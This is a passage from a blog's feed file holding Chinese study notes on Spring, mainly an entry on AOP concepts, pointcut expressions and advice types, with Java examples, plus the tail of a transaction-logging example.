class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">LogService</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> LogDao logDao;</span><br><span class="line">  <span class="keyword">private</span> AccountDao accountDao;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountDao</span><span class="params">(AccountDao accountDao)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.accountDao = accountDao;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Autowired</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogDao</span><span class="params">(LogDao logDao)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.logDao = logDao;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addLog</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">double</span> money)</span> &#123;</span><br><span class="line">    <span class="type">Account</span> <span class="variable">fromAccount</span> <span class="operator">=</span> accountDao.selectByID(from);</span><br><span class="line">    <span class="type">Account</span> <span class="variable">toAccount</span> <span class="operator">=</span> accountDao.selectByID(to);</span><br><span class="line">    <span class="keyword">return</span> logDao.addLog(<span class="string">&quot;转账操作由&quot;</span>+fromAccount.getAccountName()+<span class="string">&quot;到&quot;</span>+toAccount.getAccountName()+<span class="string">&quot;,金额:&quot;</span>+money);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;事务简介&quot;&gt;&lt;a href=&quot;#事务简介&quot; class=&quot;headerlink&quot; title=&quot;事务简介&quot;&gt;&lt;/a&gt;事务简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;事务作用：在数据层保障一系列的数据库操作同成功同失败&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;通过平台事务</summary>
      
    
    
    
    <category term="Spring" scheme="https://kallenblue.github.io/categories/Spring/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring-AOP</title>
    <link href="https://kallenblue.github.io/2022/10/01/Spring/Spring-AOP/"/>
    <id>https://kallenblue.github.io/2022/10/01/Spring/Spring-AOP/</id>
    <published>2022-10-01T03:25:28.000Z</published>
    <updated>2022-10-02T09:08:00.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>笔记源自<a href="https://www.bilibili.com/video/BV1Fi4y1S7ix">黑马程序员2022新版SSM框架教程</a></p></blockquote><h1 id="AOP简介"><a href="#AOP简介" class="headerlink" title="AOP简介"></a>AOP简介</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><blockquote><p>AOP(Aspect Oriented Programming)面向切面编程，一种编程范式，指导开发者如何组织程序结构</p></blockquote><blockquote><p>作用：在不惊动原始设计的基础上为其功能进行增强</p></blockquote><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><blockquote><p>连接点(JoinPoint)：程序执行过程中的任意位置，粒度为 执行方法、抛出异常、设置变量等</p></blockquote><ul><li>在SpringAOP中理解为方法的执行</li></ul><blockquote><p>切入点(Pointcut)：匹配连接点的式子</p></blockquote><ul><li>在SpringAOP中，一个切入点可以只描述一个具体方法，也可以匹配多个方法</li></ul><blockquote><p>通知(Advice)：在切入点执行的操作，也就是共性功能</p></blockquote><ul><li>在SpringAOP中，功能最终以方法的形式呈现 </li></ul><blockquote><p>通知类：定义通知的类</p></blockquote><blockquote><p>切面(Aspect)：描述通知与切入点的对应关系</p></blockquote><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/caf3c091-3359-4f28-a258-f6ff4389ff00.png"></p><h1 id="AOP入门实例"><a href="#AOP入门实例" class="headerlink" title="AOP入门实例"></a>AOP入门实例</h1><h2 id="需要的依赖"><a href="#需要的依赖" class="headerlink" title="需要的依赖"></a>需要的依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="定义切面类"><a href="#定义切面类" class="headerlink" title="定义切面类"></a>定义切面类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Pointcut(&quot;execution(void com.Learning2.service.UserService.test())&quot;)</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;测试。。&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>切入点定义依托一个不具有实际意义的方法进行，即无参数，无返回值，方法体无实际逻辑</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Pointcut(&quot;execution(void com.Learning2.service.UserService.test())&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>绑定切入点与通知关系，并指定通知添加到原始连接点的具体执行位置</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br></pre></td></tr></table></figure><blockquote><p>定义通知类受Spring容器管理，并定义当前类为切片类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br></pre></td></tr></table></figure><blockquote><p>开启Spring对AOP注解驱动的支持</p></blockquote><p>在SpringConfig类中加上@EnableAspectJAutoProxy注解</p><h1 id="AOP工作流程"><a href="#AOP工作流程" class="headerlink" title="AOP工作流程"></a>AOP工作流程</h1><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul><li><strong>1.Spring容器启动</strong></li><li><strong>2.读取所有切面配置中的切入点</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br></pre></td></tr></table></figure></li><li><strong>3.初始化Bean，判定Bean对应的类中的方法是否匹配到任意切入点</strong><ul><li>匹配失败，创建对象</li><li>匹配成功，创建原始对象（目标对象）的代理对象</li></ul></li><li><strong>4.获取Bean执行方法</strong><ul><li>获取Bean，调用方法并执行，完成操作</li><li>获取的Bean是代理对象，根据代理对象的运行模式运行原始方法以及增强内容，完成操作</li></ul></li></ul><h2 id="核心概念-1"><a href="#核心概念-1" class="headerlink" title="核心概念"></a>核心概念</h2><ul><li><p><strong>目标对象(Target)</strong></p><blockquote><p>原始功能去掉共性功能对应的类产生的对象，这种对象是无法直接完成最终工作的</p></blockquote></li><li><p><strong>代理(Proxy)</strong></p><blockquote><p>目标对象无法直接完成工作，需要对其进行功能回填，通过原始对象的代理对象实现</p></blockquote><h2 id="SpringAOP本质"><a href="#SpringAOP本质" class="headerlink" title="SpringAOP本质"></a>SpringAOP本质</h2></li><li><p><strong>代理模式</strong></p><h1 id="AOP切入点表达式"><a href="#AOP切入点表达式" class="headerlink" title="AOP切入点表达式"></a>AOP切入点表达式</h1></li><li><p><strong>切入点：要进行增强的方法</strong></p></li><li><p><strong>切入点表达式：要进行增强的方法的描述方式</strong></p></li></ul><h2 id="切入点表达式的标准格式"><a href="#切入点表达式的标准格式" class="headerlink" title="切入点表达式的标准格式"></a>切入点表达式的标准格式</h2><p><strong>动作关键字(访问修饰符 返回值 包名.类/接口名.方法名(参数) 异常名)</strong></p><ul><li><p><strong>动作关键字：描述切入点的行为动作，例如execution表示执行到指定切入点</strong></p></li><li><p><strong>访问修饰符：public，private等，默认public</strong></p></li><li><p><strong>返回值</strong></p></li><li><p><strong>包名</strong></p></li><li><p><strong>类/接口名</strong></p></li><li><p><strong>方法名</strong></p></li><li><p><strong>参数</strong></p></li><li><p><strong>异常名：方法定义中抛出指定异常，可以省略</strong></p><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><blockquote><p>可以使用通配符描述切入点，快速描述</p></blockquote></li><li><p><strong>*：单个独立的任意符号，可以独立出现，也可以作为前缀或者后缀的通配符出现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execution(<span class="keyword">public</span> * com.Learning2.*.UserService.find*(*))</span><br></pre></td></tr></table></figure><blockquote><p>匹配com.Learning2包下的任意包中的UserService类或接口中所有find开头的带有一个参数的方法</p></blockquote></li><li><p><strong>..：多个连续的任意符号，可以单独出现，常用于简化包名和参数的书写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execution(<span class="keyword">public</span> User com..UserService.findByID(..))</span><br></pre></td></tr></table></figure><blockquote><p>匹配com包下的任意包中的UserService类或接口中所有名称为findByID的方法</p></blockquote></li><li><p><strong>+：专用于匹配子类类型</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execution(* *..*Service+.*(..))</span><br></pre></td></tr></table></figure><h2 id="书写技巧"><a href="#书写技巧" class="headerlink" title="书写技巧"></a>书写技巧</h2></li><li><p>所有代码按照标准格式开发，否则以下技巧全部失效</p></li><li><p>描述切入点通常<strong>描述接口</strong>，而不描述实现类</p></li><li><p>访问控制修饰符针对接口开发均采用public描述(<strong>可省略访问控制修饰符描述</strong>)</p></li><li><p>返回值类型对于增删改类使用精准类型加速匹配，对于查询类使用*统配快速描述</p></li><li><p><strong>包名</strong>书写<strong>尽量不使用..匹配</strong>，效率过低，常用*做单个包描述匹配，或精准匹配</p></li><li><p><strong>接口名/类名</strong>书写名称与模块相关的<strong>采用*匹配</strong>，例如UserService书写成*Service，绑定业务层接口名</p></li><li><p><strong>方法名</strong>书写以<strong>动词</strong>进行<strong>精准匹配</strong>，名词采用*匹配，例如getByID书写成getBy*，selectAll书写成selectAll</p></li><li><p>参数规则较为复杂，根据业务方法灵活调整</p></li><li><p>通常<strong>不使用异常</strong>作为<strong>匹配</strong>规则</p></li></ul><h1 id="AOP通知类型"><a href="#AOP通知类型" class="headerlink" title="AOP通知类型"></a>AOP通知类型</h1><ul><li><strong>AOP通知描述了抽取的共性功能，根据共性功能抽取的位置不同，最终运行代码时要将其加入到合理的位置</strong></li><li><strong>AOP通知共分为5种类型</strong><ul><li>前置通知</li><li>后置通知</li><li>环绕通知（重点）</li><li>返回后通知（了解）</li><li>抛出异常后通知（了解）</li></ul></li></ul><h2 id="前置通知"><a href="#前置通知" class="headerlink" title="前置通知"></a>前置通知</h2><ul><li>名称：@Before</li><li>类型：方法注解</li><li>位置：通知方法定义上方</li><li>作用：设置当前通知方法与切入点之前的绑定关系，当前通知方法在原始切入点方法前运行</li><li>范例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;运行前&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>相关属性：value（默认）：切入点方法名，格式为类名.方法名（），如果在同一个类中，类名可省略</li></ul><h2 id="后置通知"><a href="#后置通知" class="headerlink" title="后置通知"></a>后置通知</h2><ul><li>名称：@After</li><li>类型：方法注解</li><li>位置：通知方法定义上方</li><li>作用：设置当前通知方法与切入点之前的绑定关系，当前通知方法在原始切入点方法后运行</li><li>范例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@After(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;运行后&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>相关属性：value（默认）：切入点方法名，格式为类名.方法名（），如果在同一个类中，类名可省略<h2 id="环绕通知"><a href="#环绕通知" class="headerlink" title="环绕通知"></a>环绕通知</h2></li><li>名称：@Around</li><li>类型：方法注解</li><li>位置：通知方法定义上方</li><li>作用：设置当前通知方法与切入点之前的绑定关系，当前通知方法在原始切入点方法前后运行</li><li>范例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;运行前&quot;</span>);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">  System.out.println(<span class="string">&quot;运行后&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>@Around注意事项<ul><li>1.环绕通知必须依赖参数ProceedingJoinPoint才能实现对原始方法的调用，进而实现原始方法调用前后同时添加通知</li><li>2.通知中如果未使用ProceedingJoinPoint对原始方法进行调用将跳过原始方法的执行</li><li>3.对原始方法的调用可以不接受返回值，通知方法设置成void即可，如果接受返回值，必须设定为Object类型</li><li>4.原始方法的返回值如果是void类型，通知方法的返回值类型可以设置成void，也可以设置成Object</li><li>5.由于无法预知原始方法运行后是否会抛出异常，因此环绕通知方法必须抛出Throwable对象</li></ul></li></ul><h2 id="返回后通知（了解）"><a href="#返回后通知（了解）" class="headerlink" title="返回后通知（了解）"></a>返回后通知（了解）</h2><ul><li>名称：@After</li><li>类型：方法注解</li><li>位置：通知方法定义上方</li><li>作用：设置当前通知方法与切入点之前的绑定关系，当前通知方法在正常执行完毕后运行</li><li>范例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">()</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;运行完毕后&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>相关属性：value（默认）：切入点方法名，格式为类名.方法名（），如果在同一个类中，类名可省略</li></ul><h2 id="抛出异常后通知（了解）"><a href="#抛出异常后通知（了解）" class="headerlink" title="抛出异常后通知（了解）"></a>抛出异常后通知（了解）</h2><ul><li>名称：@AfterThrowing</li><li>类型：方法注解</li><li>位置：通知方法定义上方</li><li>作用：设置当前通知方法与切入点之前的绑定关系，当前通知方法在原始切入点方法运行抛出异常后执行</li><li>范例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">()</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;运行抛出异常后&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>相关属性：value（默认）：切入点方法名，格式为类名.方法名（），如果在同一个类中，类名可省略</li></ul><h2 id="案例测试"><a href="#案例测试" class="headerlink" title="案例测试"></a>案例测试</h2><blockquote><p>测试Service类中的方法的运行时间</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAdvice</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//service包下的所有以Service为后缀的类的所有方法</span></span><br><span class="line">  <span class="meta">@Pointcut(&quot;execution(* com.Learning2.service.*Service.*(..))&quot;)</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">pointCut</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">    <span class="comment">//代表了一次执行的签名信息，封装了这一次的执行过程</span></span><br><span class="line">    <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> pjp.getSignature();</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> signature.getDeclaringTypeName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> signature.getName();</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">    <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    System.out.println(<span class="string">&quot;执行时间：&quot;</span>+className+<span class="string">&quot;.&quot;</span>+method+<span class="string">&quot;----&gt;&quot;</span>+(end-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>测试类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(SpringConfig.class);</span><br><span class="line"></span><br><span class="line">    <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> applicationContext.getBean(UserService.class);</span><br><span class="line"></span><br><span class="line">    userService.test();</span><br><span class="line">    userService.findAll();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">This is Service</span><br><span class="line">执行时间：com.Learning2.service.UserService.test----&gt;0ms</span><br><span class="line">十月 02, 2022 3:56:30 下午 com.alibaba.druid.support.logging.JakartaCommonsLoggingImpl info</span><br><span class="line">信息: &#123;dataSource-1&#125; inited</span><br><span class="line">执行时间：com.Learning2.service.UserService.findAll----&gt;2397ms</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h1 id="AOP通知获取数据"><a href="#AOP通知获取数据" class="headerlink" title="AOP通知获取数据"></a>AOP通知获取数据</h1><h2 id="获取切入点方法的参数"><a href="#获取切入点方法的参数" class="headerlink" title="获取切入点方法的参数"></a>获取切入点方法的参数</h2><ul><li>JoinPoint：适用于前置、后置、返回后、抛出异常后通知</li><li>ProceedingJoinPoint：适用于环绕通知</li></ul><blockquote><p>JoinPoint对象描述了连接点方法的运行状态，可以获取到原始方法的调用参数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint jp)</span>&#123;</span><br><span class="line">  Object[] args = jp.getArgs();</span><br><span class="line">  System.out.println(Arrays.toString(args));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ProceedingJoinPoint是JoinPoint的子类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">  Object[] args = pjp.getArgs();</span><br><span class="line">  System.out.println(Arrays.toString(args));</span><br><span class="line">  <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取切入点方法返回值"><a href="#获取切入点方法返回值" class="headerlink" title="获取切入点方法返回值"></a>获取切入点方法返回值</h2><ul><li>返回后通知</li><li>环绕通知 <blockquote><p>返回后通知可以获取切入点方法中的返回信息，使用形参可以接受对应的返回值</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(value = &quot;pointCut()&quot;,returning = &quot;ret&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(Object ret)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;afterReturning ...&quot;</span>+ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>环绕通知中可以手工书写对原始方法的调用，得到的结果即为原始方法的返回值</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> pjp.proceed();</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取切入点方法运行异常信息"><a href="#获取切入点方法运行异常信息" class="headerlink" title="获取切入点方法运行异常信息"></a>获取切入点方法运行异常信息</h2></li><li>抛出异常后通知</li><li>环绕通知<blockquote><p>抛出异常后通知可以获取切入点方法中出现的异常信息，使用形参可以接受对应的异常对象</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(value = &quot;pointCut()&quot;,throwing = &quot;throwable&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">(Throwable throwable)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;afterThrowing...&quot;</span>+throwable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在环绕通知中可以直接用try catch来接收异常</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;pointCut()&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span>&#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    ret = pjp.proceed();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;笔记源自&lt;a href=&quot;https://www.bilibili.com/video/BV1Fi4y1S7ix&quot;&gt;黑马程序员2022新版SSM框架教程&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;AOP简介&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="Spring" scheme="https://kallenblue.github.io/categories/Spring/"/>
    
    
    <category term="AOP" scheme="https://kallenblue.github.io/tags/AOP/"/>
    
  </entry>
  
  <entry>
    <title>Spring-整合</title>
    <link href="https://kallenblue.github.io/2022/09/29/Spring/Spring-%E6%95%B4%E5%90%88/"/>
    <id>https://kallenblue.github.io/2022/09/29/Spring/Spring-%E6%95%B4%E5%90%88/</id>
    <published>2022-09-29T15:39:54.000Z</published>
    <updated>2022-10-01T14:55:02.707Z</updated>
    
